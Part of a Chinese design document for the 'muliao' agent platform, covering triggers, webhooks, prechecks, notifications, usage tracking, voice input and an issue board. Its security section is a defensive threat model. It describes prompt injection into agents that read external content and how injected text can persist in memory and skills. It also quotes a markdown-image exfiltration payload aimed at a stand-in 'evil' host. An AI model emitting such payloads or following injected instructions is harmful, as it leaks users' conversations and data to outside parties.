**流式触发**（`triggers/stream.py`）：平台托管一条常驻命令（如 Slack Socket Mode 监听），stdout 每一行是一个事件。`StreamRunner.run_forever` 在根任务组里 `watch()` 触发器变化并对账：每个启用的流式触发器一个受监督的进程（由 agent、配置、`state.generation` 决定，变了就取消重起；只改说明不重起。停用再启用即重启：重新启用换 generation，两次修改被合并成一次对账时也重起，且在同一事务里清掉 `running_since`，新进程登记前不显示旧进程的），停用、删除、改配置、关停时取消即 `kill_group` 杀掉整个进程组并限时回收。命令与前置检查、`run_shell` 共用 `platform/shell.py`（`spawn_bash`，pipefail、最小环境、secret 注入与替换），在 agent 工作目录里运行；退出以 `returncode` 为准（`platform/output.wait_exit_code`，后代占着管道时 `Process.wait` 不返回），退出后也杀掉整组（留下的后代不随重启越积越多）。stderr 与后台任务共用 `platform/output.record_output`（逐块脱敏、跨块的 secret 不漏、增量解码）追加到 `trigger-logs/<名称>.stderr.log`，每次启动前超过 1 MiB 轮换并写一行分隔。退出（任何退出码）、secret 不可见、一次启动里的意外异常都算一次失败：原因（含日志结尾）记在 `state.error`，按 1…2^n 秒（上限 5 分钟）退避重启，稳定运行 60 秒算恢复（清错误、计数归零），连续快速失败达 3 次时 `Notify` 一次。运行状态只由运行器写，只写给仍启用、配置未变的行（被取消的旧进程不覆盖新的）；每个托管进程开始时清零（服务重启、换配置都从头算）；停用时 `running_since` 按启用推导为空。事件在内存里排队：第一行到后等 `debounce_seconds`，上一次触发的会话不是 idle（与定时触发同一个 `previous_fire_state_in`）就继续排队，空闲后合并成一次 `fire_activated`（新会话，有前置检查时事件作为它的 stdin，失败分类与到期扫描共用）；挡路的会话在等待时通知一次（这份托管进程内每个挡路会话一次，不持久化，服务重启后可能再通知一次）。队列以事件上限为界：排满就不再读命令的输出，管道写满后命令自己阻塞——不重叠、不丢、内存与并行会话有界；单行超限丢弃并记日志。排队的事件不持久化，重启、改配置、停用会丢；一批开始触发后不再重试（至多一次：前置检查失败、触发意外失败都丢弃这一批）；命令退出时队列正满，管道里没读完的输出限时读、读不完的丢弃：断线重连、去重、游标和轮询兜底由命令自己负责（公共 skill `stream-listener`）。

**已结束**（`finished_at`，触发器的公共概念，不属于某一种方式）：这个触发器不会再触发了。一次性触发器在它那次到期被消耗时结束——无论随后是真的投递、前置检查判定没事，还是触发失败（失败另记 `disabled_reason`）。结束之后：不出现在默认列表（`trigger_list`、`GET /triggers`、界面主列表），不能再 `update` / 启用 / 立即运行（`Conflict`），可以删除；名称只在**未结束**的触发器之间唯一（部分唯一索引 `WHERE finished_at IS NULL`），所以同名的可以重新创建，按名称（`get_by_name`、webhook 的鉴权）找到的也只有未结束的那个。行永久保留，`id` 永不复用，它发起过的会话（`origin='trigger'`、`origin_ref` 是它的 id）因此一直查得到是谁发的：`GET /triggers?finished=true` 列出已结束的，`GET /sessions?origin=trigger&origin_ref=<id>` 列出某个触发器发起过的会话（走会话领域的查询，触发器领域不碰 `sessions` 表），`trigger_list(finished=true)` 让 agent 查一次性任务的结果（带 `finished_at` 与 `last_session_id`）。

「立即运行一次」（`TriggerService.run`，界面按钮与 `trigger_run`）是**管理操作**，不是激活机制：它不消耗一次性触发器预定的那一次（到点仍会触发），并且拒绝已结束的；激活机制走 `fire`。

**前置检查**（`triggers/precheck.py`，所有触发方式共用，触发器的公共字段 `precheck`）：做法同 Hermes 的 script / monitor 模式——触发前先跑一条便宜、确定性的命令，有事才调用 agent，没事不花模型调用。命令在该 agent 的工作目录里用 `bash -o pipefail` 执行（管道里任何一步失败都算检查失败：`curl … | jq` 里 curl 失败时 jq 照样退出 0，否则故障会变成静默的「没事」；与 `run_shell` 共用 `platform/shell.py`：最小环境变量、按 key 注入 secret、输出里的 secret 替换掉、超时杀进程组），stdin 是原始事件内容（webhook 请求体，定时与手动为空），在数据库事务之外执行，时限 `runtime.precheck_timeout_seconds`（默认 30 秒：webhook 的调用方在同步等它，检查本该便宜），这个时限写进 `trigger_create` 的工具说明，agent 写检查脚本时知道上限（包括重试在内）。同一轮到期的定时触发器并发执行，一个慢的检查不拖住其他触发器。退出码 0 时按 `fire_when` 决定（`decide`，纯逻辑）：
- `output`（默认）：输出非空就触发，输出作为事件内容交给 agent（替换原始事件，可借此过滤、裁剪）；为空不触发。增量由命令自己做（游标存在工作目录）。
- `changed`：与上一次成功检查的输出（存在触发器的 `precheck_output`）逐字比较，变了才触发，交给 agent 的是统一 diff 加完整输出（所以实际可用的输出上限约为事件上限的一半）；命令只需打印当前状态。第一次运行只记基线、不触发（Hermes 首轮会白调一次模型）。修改前置检查时清空基线。
- 非 0 退出、超时、输出（或 diff 加输出）超过事件上限、secret 不可见：检查本身失败，不触发，原因记在 `precheck_error`，触发器保持启用（脚本的故障往往是暂时的）；从正常变为出错时给触发器所属的 agent 投一封信、开新会话（来源 trigger，awaited=False，与记下失败同一事务发出 `Receive`；`precheck_alert` 写明命令、fire_when、出错原因和处理指引：暂时性故障不用管，脚本 bug 用 `trigger_update` 修、`trigger_run` 验证，自己解决不了再 `notify_user`；已结束的一次性触发器附上原 prompt，说明任务没执行）——脚本是 agent 写的，由它修，用户不当中转；这封信投不进去（agent 正在删除）时退回给用户发系统通知（`Notify`），不静默吞掉。之后持续出错不再重复，检查成功即清除。不加「连续 N 次才告警」的阈值（先观察抖动误报）。「立即运行」（`run`）的检查失败只报给调用方，不记在触发器上、不告警：agent 修脚本时用它验证不会再开出告警会话，用户点运行看到的失败也不会压住之后自动触发时给 agent 的告警。webhook 的外部调用方只收到 502，看不到原因（可能含脚本的 stderr）。
- 检查在触发器上的状态（`precheck`、基线 `precheck_output`、`precheck_error`、`last_checked_at`）只在 `precheck.py` 迁移：`set_precheck`（换检查清基线与失败）、`current_in`（结果是否作废）、`passed`（判定并记成功与基线）、`failed`（记失败，返回要不要告警）；`TriggerService` 只编排事务、投信与告警的投递。
- 检查期间触发器被删除、停用或改了检查，这次结果作废，成功与失败都一样（旧命令的失败不会记到新配置上）。同一个触发器的两次检查恰好并发（如手动运行撞上定时）时，后提交的以先提交的输出为基线，最坏多触发一次，自然收敛，不加锁。`last_checked_at` 记最近一次检查的时间，让用户看到「在检查、只是没事」。
- 不提供 Hermes 的 no_agent（输出原样推送、不经过 agent）：它绕过「一切都经过会话」，推送的内容不属于任何会话；需要省模型调用时用 `changed` 只在变化时叫 agent。

**投信**：别的领域投信只有一个入口 `sessions.api.receive_command_in`（只读：校验来信、返回定向命令 `Receive`，发送方在同一事务里 `send_in`）。`TriggerService.fire` 在触发器自己的事务里校验来信（读的会话、agent、文件都是只会单向变化或不变的事实，不合规当场报错给调用方）、记下触发（时间、前置检查的输出、上一次的会话），同一事务发出定向命令 `Receive`（新建会话的 id 在这里预先分配），由会话领域在自己的事务里投信：记下触发与投信都恰好一次。提交之后马上执行这条投递（`Worker.run_now`），通常返回时会话已经存在，调用方可以立即续写；做不到（lane 正忙）就由 worker 稍后投递，这期间续写它会得到 404。`Receive` 按目标会话分 lane，同一会话的来信按发送顺序投递；按 `SessionKey` 定位的投递在会话存在之前就要有 lane，按 key（来源、发送方、agent）命名，同一个 key 串行，「没有就建」不会建出两个会话（工作状态也看这条 lane 上没投递的来信；会话还没建出来、信还排着时算 running，`SessionActivity.keyed_work_states_in`）。按 key 投信的发送方（issue）只用 key 投，不按会话 id 续写它的会话，所以同一会话的来信只在一条 lane 上、顺序不乱。投递时会话或 agent 已被删除就丢弃并记日志。投递处理器自己的失败按队列规则记账（重试或失败可见），不抛给调用方；只有领取这条投递时出错（如数据库暂时不可用）请求才报错，投递仍由 worker 完成，外部调用方此时重试会多触发一次。

任何未结束的触发器都可以在界面上或用 `trigger_run` 立即运行一次（不带事件内容）；有前置检查时同样先跑检查，可以用来测试整条链路。事件内容（若有）原样附在处理说明之后：

```
<处理说明>

<event>
<请求体>
</event>
```

**webhook**：
- 带 `Authorization: Bearer <token>`，响应 `{"session_id": ...}`；请求体为 UTF-8 文本，最多 256 KiB。
- 不走登录 cookie，**先鉴权再读请求体**：未鉴权的调用方不能让进程读入任何内容；请求体按字节上限分块读取，超限返回 413。触发器不存在、不是 webhook、还没有 token、token 不匹配，都返回同一个 401，不暴露哪些名称存在；停用的返回 409；续写不是本触发器发起的会话返回 403。
- token 是我们签发给外部系统的凭证，事实来源是触发器自己：`state` 里只存 SHA-256，明文只在生成时返回一次，**只能由用户在界面上生成**（agent 创建的 webhook 在用户生成 token 之前收不到事件）。不放进 vault——vault 存的是外部系统发给我们的凭证。
- 不校验各平台自己的签名格式（GitHub、Slack 等各不相同）。需要时由发送方把 token 放进 Authorization 头，或在中间加一层转发。

**通知**（`notifications/`：`inbox.py` 是收件箱，`notifications` 表只在这里读写；`push.py` 是推送——设备订阅 `push_subscriptions`、排推送 `schedule_in`、`DeliverHandler`，经注入的 `MessageSource`（`inbox.push_message_in`）取内容，不碰收件箱的表；推送实现 `Pusher`（`webpush.py`，Web Push 与 VAPID）只收值对象 `Device` 与 `PushMessage`，不收 ORM 对象）：运行的回答给在等它的用户（订阅 `RunEnded`：处理过的信件有 `awaited`，且做完了或停下来问用户，用户自己停止的不推）、运行最终失败（订阅 `RunFailed`：列在会话列表里的会话都通知，点开是那个会话；私有 thread 的失败已作为结果交回发问方，不单独通知；运行中途的工具报错由 agent 自己处理，不算）、agent 调 `notify_user`、前置检查告警投不到 agent 时的兜底、定时触发被等待中的会话挡住、issue 交给用户（定向命令 `Notify`）、推送测试，都经 `Notifications` 内部的 `_enqueue_in` 在通知领域自己的事务里写一条 `notifications` 行，并在同一事务交给推送给当时的每个推送订阅各排一个 deliver task（只带 `notification_id` 与订阅的 endpoint；没有订阅就只留在通知页）。DeliverHandler 投递时经收件箱取通知内容（`PushMessage`，含当时的未读数；通知已删就跳过）、取设备（排队后已退订就跳过），Web Push 的载荷带上这个数，Service Worker 收到后设置应用图标角标（Badging API，iOS 16.4+ 主屏应用）；应用在打开、回到前台、收到新通知事件（SSE `notification`，写下通知的事务提交后发出，与有没有推送订阅无关）和标记已读之后从服务端重新取未读数，刷新导航上的数字与角标。会话的未读不另存：有指向它的未读通知就是未读（`Notifications.unread_sessions`，会话接口的 `unread` 由此派生），所以定时任务正常跑完、不通知用户的会话不是未读。已读规则：打开通知页标记到列出的最新一条为止（之后才到的保持未读）；打开会话时只由会话领域标记（`SessionService.mark_read`），同一事务发布 `SessionRead`，通知领域订阅它把指向这个会话的通知标为已读（提交后 `run_now` 马上投递，通常请求返回时未读数已更新；同一 lane 上有更早的投递时由 worker 稍后处理，界面在 `event` 投递完成时重新取未读数）。通知随它指向的会话删除（订阅 `SessionDeleted`）；issue 交给用户的通知另带 `issue_id`（不设外键，issue 属于别的领域；issue 被删后点开看到「不存在」），点开打开 issue 详情页而不是会话，打开详情页即已读（`POST /api/notifications/issues/{id}/read`）；推送载荷带 `issue_id`，Service Worker 给这种通知加「通过」「打回」两个 action——只有 Chromium 显示（Safari、iOS 主屏应用不支持通知按钮，也没有输入框，点开就是详情页的审核栏）：「通过」由 SW 带登录 cookie 直接调接口并标已读，失败就打开详情页；「打回」打开详情页（`?review=reject`，聚焦理由）；`RunEnded`、`RunFailed`、`SessionRead`、`SessionDeleted` 在同一条按会话的 lane 上；系统通知点开进通知页，所以这种兜底告警在检查恢复、`precheck_error` 清除之后仍看得到。点通知的跳转不只靠消息（iOS 主屏应用开着时 SW 可能列不出它的窗口、openWindow 对开着的应用不跳转，挂起或冷启动时消息会丢）：SW 先把 url 写进 Cache Storage（`muliao-pending-navigation`），在同名 BroadcastChannel 上广播 `navigate` 叫醒开着的页面，再聚焦窗口或（列不出窗口时）openWindow；页面（`web/src/swNavigate.ts`）在加载、回到前台、获得焦点、收到广播时去取（只有可见的页面取，桌面后台标签不抢），每次点击一条、取时全删只认最新的，超过 2 分钟的不跳，已在目标页不重复跳。

通知只有 Web Push 一种渠道。不支持主动推送的外部消息源（例如只能拉取的 Slack 未读）用定时触发器拉取：例如每分钟让 agent 通过 Slack MCP（或 skill 中的脚本 + vault token）读取未读消息，游标由 agent 存在自己的工作目录。

## 15. 安全边界

**威胁模型：agent 与运行服务的系统用户同等可信。** agent 能执行任意 shell 命令，因此能读到服务能读到的一切——包括配置文件里的 `vault.key` 与 LLM API key、数据库文件。下面的措施只防止 secret **意外**进入对话记录、日志和前端，不防 agent 本身：

能缩小的是**提示注入的影响面**：处理外部事件或网页内容的 agent 用自己的 deny 收窄（如 `tool:trigger_*`），不分给它用不到的 MCP 与 secret，这样即使输入里带有恶意指令，能动的东西也有限；base 本身没有管理类工具（全局记忆、agent 与角色管理），也改不了别人的条目。

注入还可能**持久化**：能写记忆与 skill 的 agent 可能把注入的内容写进它们（经角色分发出去的 skill 会带进拿到它的每个 agent），之后该 agent 的每次运行都会带着它；全局记忆只有 `admin` 能写，但写进去的会带进**每个** agent 的运行。缓解手段是版本历史与改的人的记录：界面上能看到每一版是谁改的，随时回滚；每日的知识审查也审全局记忆的改动。

- shell 只继承少量环境变量（`PATH`、`HOME` 等）；
- `run_shell(secrets=[KEY])` 输出中的 secret 明文被替换为 `[secret:KEY]`（逐字匹配，编码后的输出不会被替换）；
- `vault_set` 的参数在持久化前脱敏；但用户在 prompt 里直接写的明文会原样保存并在之后的请求里发给模型——敏感值应在 UI 的 Vault 页录入。

如需真正隔离，应让服务以独立系统用户运行、把配置文件与数据目录放在 agent 可读范围之外并限制权限，或把 shell 放进沙箱。

其他边界：

- Web 与 API：单用户密码登录（至少 8 位），HMAC 签名 cookie（密钥至少 32 位），有效期 90 天。签名 key 由密钥与密码摘要一起派生：改密码（改配置后重启）即吊销所有已签发的 cookie，没有服务端会话表；登出只删浏览器里的 cookie。登录接口未做频率限制，部署在公网时应在反向代理层限流。
- 文件下载：与界面同源、带着登录 cookie，内容按不可信处理（agent 能写任意 HTML/SVG）。响应一律带 `X-Content-Type-Options: nosniff` 与 `Content-Security-Policy: sandbox`，只有 png/jpeg/gif/webp 按 inline 返回，其余一律 `Content-Disposition: attachment`，不在本站执行（同 Matrix 媒体下载）。
- 回答里的图片：前端只渲染指向 `/api/files/` 的图片，外链图片显示为普通链接。否则被注入的模型输出 `![](https://evil/?d=<对话内容>)`，打开会话时浏览器就会自动把数据发出去。
- Vault：Fernet 加密，主密钥来自配置 `vault.key`，缺失或格式错误时拒绝启动。
- 配置文件：唯一配置来源（`config.example.toml`），未知键直接报错，避免拼写错误被静默忽略。
- 日志不打印 secret 值与 token。

## 16. 部署形态与边界

- **单进程**：事务串行化与 task 领取依赖进程内锁，所以只跑一个进程。这不影响 agent 并发：worker 同时执行所有可领取的 task（不同 session、不同 agent 并行，同一 session 串行），模型请求按 provider 限流（见 3.2「并发」）。模型调用与工具执行都是异步 IO，不占事务锁。
- **外部消息**：能主动推送的外部系统接入 webhook 触发器；只能拉取的由定时触发器拉取（见第 14 节）。
- **上下文压缩的覆盖范围**：按上一次请求报告的 token 数在步与步之间压缩，不预估下一次请求的大小：一步里的工具结果极大、直接超出模型上限时，那次运行失败可见，在会话页点「压缩」后重试即可。不自动识别各提供方的超限错误，因为错误格式各不相同，无法可靠识别。

## 17. 前后端契约

- **接口类型只有一份**：后端的请求、响应模型与 SSE 事件模型（`api/events.py` 的 `ServerEvent`：任务状态 `platform.bus`、`saved`、运行条目与运行文字增量 `sessions.live`、新通知 `notifications.events.NotificationEvent`、心跳）就是契约。`python -m muliao.api.app` 输出与服务一致的 OpenAPI 描述，提交为 `web/openapi.json`，后端测试保证它与接口一致；前端类型 `web/src/schema.d.ts` 由 `npm run gen:api`（openapi-typescript）生成，前端测试保证它与描述一致。改了接口：重新生成两份，再改前端。
- **前端调用按描述类型化**（`api.ts` 的 `call`）：每个调用写一次路径模板（如 `/api/agents/{agent_id}`），路径参数、查询参数、请求体与成功响应的类型都从生成的 `paths` 推出；没有响应体的接口类型为 `void`。`api.ts` 只给生成的类型起名字，并在边界上把 agent id 字段换成品牌类型 `AgentId`。唯一的例外是上传（请求体是文件本身，描述里没有 JSON 请求体）。
- **SSE 用 FastAPI 自带的事件流**（`/api/events`，`EventSourceResponse`）：每条 data 按 `ServerEvent` 校验并序列化。`ServerEvent` 是具名组件，前端的事件联合直接取它（openapi-typescript 还不认识 OpenAPI 3.2 的 `itemSchema`），只加上前端自己产生的两种：`connected`（每次连上都发，第一次也发：页面的首次请求可能早于订阅建立）与 `changed`（页面自己改了某类数据，如删会话、标已读、增删改 agent，服务端不为这些发事件；分屏并排的列表据此刷新，`events.announceChange`）。数据库是唯一事实源，事件只是展示加速：前端收到任务状态变化、`saved`、连上、`changed` 时从接口重新拉取（按所展示的数据类别 `Resource` 重新拉取的页面用 `events.useRefetch`，会话页按运行事件自己合并；agent 列表是各处共用的一份缓存 `ui.useAgents`）。单个页面监听器抛错不影响其他监听器（`reportError` 报告）。
- **实时条目与历史同一个投影**（`sessions/transcript.py`）：前端把快照（会话接口的 `live`）与之后收到的事件按 `segment_id`、`seq` 合并，完整条目原样接上，文字增量接在同类最后一条后面（`events.liveItems`），不自己投影。
- **结构化状态由后端给出**：`ask_user` 条目的状态见第 7 节；前端不解析工具结果文本。
- **路由**：前端会话页地址只由 `api.sessionRoute` 构造（通知点开的地址由后端 `Notification.url` 唯一给出，推送与通知页（`NotificationOut.url`）共用，与前端路由一致）；webhook 地址只由 `triggers.webhook.hook_url` 构造。

## 18. 领域之间的最终一致：三条判据

| 跨领域效果 | 失败可见 | 可收敛 | 代价 |
|---|---|---|---|
| 委派结局交回发起方 | 与结清同一事务，结清失败即整个事务回滚、随运行的失败可见 | 每个关联只结清一次；停止之后的结局按占用 cleared 不投 | 无（同一事务） |
| 推送 | 投递任务失败可见、可重试；Web Push 失败语义不变 | 处理器的写入与投递完成同一事务，每次运行恰好一条通知；重试时确认会话还在 | 推送晚几百毫秒 |
| 停止后结束后台任务、停下委派出去的 thread | 投递任务失败可见 | 结束进程与停止 thread 幂等；迟到结局不投 | 停止后进程与 thread 可能多跑几百毫秒 |
| 删除会话后的清理（通知） | 同上 | 删除幂等 | 指向已删除会话的通知短暂存在 |
| 删除 agent | 正在删除的状态可见；投递失败可见 | 每步幂等；忙的会话先停止再删除 | agent 从列表消失与目录删除之间有窗口 |
| 后台任务的发起中途失败或崩溃 | 行留在 running，可查 | 没有监督者的行只有一条收敛规则，检查前与启动时对账 | 对账前多占一行 |
| 触发器投信 | 投递任务失败可见 | 记下触发与投信恰好一次（定向命令）；马上执行，做不到由 worker 投递 | 极少数情况下会话晚几毫秒出现 |

## 19. 用量

**职责**：记下每次模型运行花掉的 token，按时间范围汇总给界面看（`usage/`，表 `model_usage`）。

- **唯一的写入方是 `agent_runtime`**（它是唯一调用模型的地方）：两个模型调用入口各对应一种运行类型——会话的运行（`run_steps`）、上下文压缩（`summarize`）。已删除的强制反思（`reflection`）与临时 agent（`temp_agent`，#183）只出现在历史账目行里。入口与类型一一对应，不靠参数分发。
- **怎么拿到用量**：每个入口在调用 pydantic-ai 之前建一个 `RunUsage` 并交给它，pydantic-ai 把每次请求的用量累加进这个对象，所以运行成功、失败还是被取消，收尾时拿到的都是**已经花掉的那部分**。两种运行（会话的逐步运行、压缩）共用一个上下文管理器 `AgentRuntime._billed`：记开始日志、交出 `RunUsage`，退出时在 `finally` 里记账（`_bill`）。
- **记账不属于这次运行**：写入失败只记 error 日志，不改变运行的结果或异常——一次记账故障不该让已经做完的工作白做，也不该把一个真正的失败换成另一个。完全没有用量（还没发出请求就失败了）就跳过，不留空行。写入放在屏蔽作用域里并加时限：被取消的运行同样花了 token，取消之后也要记下来（屏蔽挡得住 anyio 的电平取消；用户停止用的原生取消是边沿触发的，对已被停止的运行来说在这之前就发出过了，见第 4 节）。剩下一个窄窗口——运行正常跑完、正在等数据库锁时用户才按停止——这一条用量随取消丢掉，不为它加防御：结局与「停止早到一瞬」相同，代价只是一条账目。
- **归属**：记到 agent 与会话名下。历史上的强制反思不属于任何会话，会话为空；历史上的临时 agent 记在发起它的会话名下。
- **token 的口径**沿用 pydantic-ai 的归一化约定：`input_tokens` 是输入总数，**已经包含** `cache_read_tokens` 与 `cache_write_tokens`（Anthropic 原始响应把它们分开报，pydantic-ai 统一过），所以展示时是「总数与其中两部分」，不相加。
- **重试会重复计数，这是对的**：失败的运行重试一次就真的再花一次 token，每次尝试各记一条。
- **汇总**：`GET /api/usage?since=&until=&group_by=agent|model|day`（可多选，左闭右开；时刻必须带时区，不带的在边界上 422）。取出区间内的行后在内存里按选中的维度相加（`usage.service._summarize`，纯函数，分组规则只有这一份）；「天」按配置的 `timezone` 划分日历日，和人看日历的方式对齐。个人规模下一次取几千行可接受，换来分组规则与时区处理都只写一遍。
- **只增不改、不参与删除清理**：删掉 agent 或会话不等于这笔钱没花过，所以 `agent_id` / `session_id` 可能指向已经不存在的东西，界面上显示为 id 或「未知」。这个领域没有事件、没有任务，也不订阅别人的删除。
- **界面**：设置 → Token 用量（`web/src/pages/Usage.tsx`）：近 7 / 30 天，合计与缓存命中比例、按 agent、按模型，以及按天的输入 token 条形图（深色部分是缓存命中）。

## 20. 语音输入

**职责**：用户在界面上说话代替打字（常常中英混杂），转成文字后照常作为消息发出（`speech/`）。agent 只看到文字，消息、历史、模型请求都不知道语音的存在。

- **流程**：按住麦克风按钮说话、松手结束（移出按钮再松手是取消），界面用 `MediaRecorder` 录音（Chrome/Firefox 是 webm/ogg 的 opus，iOS/Safari 是 mp4 的 aac），停止后把原始音频 `POST /api/transcriptions`（请求体就是音频，Content-Type 是它的类型，同 `/api/files`），拿回 `{text}`。会话页拿到文字就接在输入框内容后面、连同附件一起发出（发不了或发送失败时留在输入框里）；新对话还要选 agent，文字只填进输入框。录音不落盘、不进数据库。
- **转写服务**：`muliao.speech.api.Transcriber`，具体服务由配置 `[transcription]` 的 `type` 选择。现有 `dashscope`：阿里云百炼的录音文件识别（`qwen-audio-3.0-asr-flash` 等，原生 `multimodal-generation` 接口，音频以 data URI 内联，`parameters.format` 必填），中英混杂原样输出；常说的术语可配即时热词 `vocabulary`。不用全模态对话模型（Qwen-Omni）：它要靠系统提示约束才不去回答语音内容，还会先思考，慢且不稳。新增一种服务 = 一个实现加一个 `type`。
- **错误**：不认识的音频类型、空录音 422；超过 `max_bytes` 413；服务端出错、网络不通是 502（`UpstreamFailed`，带上服务给的原因），界面显示后用户重录即可，不重试。听不到说话时返回空文字，界面提示「没有听到说话内容」。
- **开关**：没配置 `[transcription]` 时 `/api/transcriptions` 是 404，`GET /api/features` 的 `transcription` 为假，界面不显示麦克风按钮；浏览器不能录音（非 HTTPS、没有 `MediaRecorder`）时也不显示。

## 21. issue 看板

**职责**：人与 agent 协作的事项（`issues/`，表 `issues`、`issue_activities` 与 `issue_dependencies`）。界面上有看板（拖拽改状态）、列表、依赖图（`web/src/issueGraph.ts`：前端用 dagre 把已加载 issue 之间的 `depends_on` 排成从左到右的分层图，默认只显示含未完成 issue 的依赖链，无依赖关系的不画）与详情页；agent 用 `issue:*` 权限的工具（`issue_list/show/create/update/comment/stop`；读的两个在 public 里）读写。

- **状态**：backlog / in_progress / in_review / blocked / done / cancelled（#258 去掉 todo：给 agent 的 todo 一建就投递，与 in_progress 只差有没有接手。#261 去掉 waiting：让 agent 自己维护「在等什么」的状态不可靠，等待由平台从会话自身看出——在等上游由依赖派生（`waiting_on`），在等后台任务、委派、到点唤醒（`wake_me`）是 issue 会话的工作状态 waiting；迁移把 waiting 改成 in_progress，降级不改回）。in_progress＝该被指派的 agent 做（包括它的会话正在等什么）；只有用户能解决的用 blocked 指派用户。**负责项目（owner）**：一个 agent（一个 agent 负责一个项目），创建时必填，不随指派变化，只能显式修改（时间线记一条）；按它筛选（`issue_list(owner=)`、`GET /api/issues?owner=`、界面的「负责项目」）看一个项目的全部来龙去脉。负责的 agent 被删除时置空。**指派人**（单列 `assignee`）：agent id、用户（`"user"`），或未指派（NULL）——现在谁在做。界面上的操作以用户身份进行（actor 为 `USER`，即 `"user"`，时间线与创建者里都这样记），工具以调用它的 agent 身份进行。
- **时间线**：每次创建、评论、每个真正变了的字段各记一条 `IssueActivity`，只增不改；删除 issue 一起删。
- **issue 会话**：每个（issue, agent）对应唯一一个会话，归会话领域：`origin=issue`、`origin_ref` 为 issue id、agent，按 `SessionKey` 定位，没有就建（会话被删了下次就新建）。issue 领域不存会话 id；界面与 `IssueOut.sessions` 上「各 agent 的会话」由 `sessions.api.keyed_sessions_among` 派生。issue 只在它自己的会话里做：普通对话只建 issue、派 issue（没有认领、让出之类的登记）。
- **依赖**（表 `issue_dependencies`，有向无环图）：issue 可以依赖别的 issue（上游），让几件事按先后做而不是同时抢着做。创建时给出（`issue_create(depends_on=)`、`POST /api/issues`）；一组互相依赖的 issue 用 `issue_create(issues=[...])` 一次建（`IssueService.create_many`，单个创建也走它）：每项可带本地 `key`，`depends_on` 里字符串是本批的 key、整数是已有编号；先不查库校验 key 唯一、引用存在、key 之间无环（已有 issue 不可能依赖新建的，环只会在本批内，按 key 报路径），再在一个事务里建全部、连好依赖、最后才算每项的投递，提交后再投——任一项不合法整批不建（错误带 `issues[n]`），先开工的子 issue 看得到同批父 issue。#213：实测 12 次拆分里至少 4 次 agent 并行逐个 `issue_create`，拿不到上游编号、依赖缺失后补，期间子 issue 已投递开工。修改时整体替换（`issue_update(depends_on=)`，`[]` 去掉全部）；上游必须存在、不能重复，成环（含依赖自己）当场拒绝并给出环上的路径（`graph.cycle_through`；依赖表只在 `issues/graph.py` 读写）。上游是 done 或 cancelled 就算完成（`rules.FINISHED`；取消也解除，由下游自己判断还做不做）；还有没完成的上游（`graph.waiting_on`，`IssueWork.waiting_on`、接口与 `issue_list` 的 `waiting_on`）时，下游还轮不到：动态照常记时间线，但不投、不算停滞（在等上游只由 `waiting_on` 派生，不靠状态）。上游从未完成进入 done / cancelled 时，同一事务里给每个下游记一条 `dependency` 动态（`{"issue": 上游, "from", "to"}`）并按投递规则投递——下游因此不再等待时，这就是让它开工的那封信（摘要带上游及其状态；等待期间没投的动态由 agent 自己 `issue_show` 看）；还在等别的上游就只记时间线。下游的状态不随上游变（一直是 in_progress，在等由 `waiting_on` 派生；#261 之前 waiting 的下游由系统转为 in_progress）：上游被重新打开，下游自然回到等待，不另做处理。修改依赖记一条 `depends_on` 动态（`{"from": [...], "to": [...]}`），同样按规则投递（去掉最后一个没完成的上游即开工）；删除 issue 时边级联删除，它的下游各记一条 `depends_on` 动态并投递。
- **投递**（收件人是 `issues.rules.recipient`，纯函数；投递本身在 `issues/delivery.py` 的 `IssueDelivery`，信件与 `issue_show` 的文本在 `issues/render.py`，`IssueService` 只编排）：issue 上的每条动态——创建、评论、状态、指派、标题、描述、优先级、负责项目、依赖的修改，以及上游完成——都作为一封信投进收件人的 issue 会话，内容（`render.delivery_message`）只有一行摘要（编号、标题、状态、指派人，有依赖时带上游及其状态）、这次的动态原文（评论全文）和一句「用 `issue_show` 看完整内容」，不随时间线变长；首封信也一样，描述、依赖与完整时间线由 agent 自己 `issue_show`（等上游期间记下的动态也靠它看）。处理指引是固定文本，放在 issue 会话的来源说明里（`issues.rules.SESSION_NOTE`，由组合根交给会话领域，属于缓存前缀），不在每封信里重复。收件人是动作之后被指派的 agent；动作之后处于 in_progress（包括这次动作让它进入）、且不在等上游才投：backlog 是以后再做，in_review / done 等是已经交出去。**用户评论唤起 owner**：用户（actor 为 `USER`）的评论，按上面的规则没有收件人时（backlog、blocked、in_review、done、cancelled，没指派或指派给用户，在等上游）投给负责项目的 agent，进它在这个 issue 上的会话，由它判断关掉、派人还是回复（用户想在 backlog 上评论让项目自己处理）；被指派的 agent 接手时只投给它，同一件事只有一个 agent 负责。agent 的评论和任何字段修改都不唤起 owner，避免 agent 之间来回唤醒；owner 为空（负责的 agent 已删）不投。被指派的 agent 在它自己这个 issue 会话里的动作不投回那里（避免自激循环）；它在别的会话（如普通对话、别的 issue 的会话、它从 issue 会话委派出去的 thread）里给自己建、派、转 in_progress 或评论，照常投进 issue 会话——thread 里的动作因此会回投一次，但不会循环（回投不产生新的动态）。一次修改改了几个字段就带上这几条动态，只投一封。两个 agent 互相改派不加限制。
- **投信**：在 issue 的事务里经 `receive_command_in` 得到定向命令 `Receive`（来源 `Origin.ISSUE`，目标 `SessionKey`）并 `send_in`，提交后 `run_now`；没有用户在等（awaited = False），结果记在 issue 上。
- **停滞**（`rules.stalled`，唯一规则）：in_progress、不在等上游、指派给 agent，而它的 issue 会话空闲或不存在（会话在等后台任务、委派、到点唤醒或提问的回答都不算：等到了会接着做）。界面卡片上依赖没完成时显示「等待 #x」。`IssueService.work` 一次算出一批 issue 的各 agent 会话、被指派 agent 会话的工作状态（`SessionActivity.keyed_work_states_in`：按发送方定位的会话，running / waiting / idle）与是否停滞，`issue_list` 与接口的 `assignee_state`、`stalled` 都来自它。界面在 `stalled` 的卡片上标「没人在处理」，muliao 的早报列出停滞的 issue（读同一个 `stalled`）。
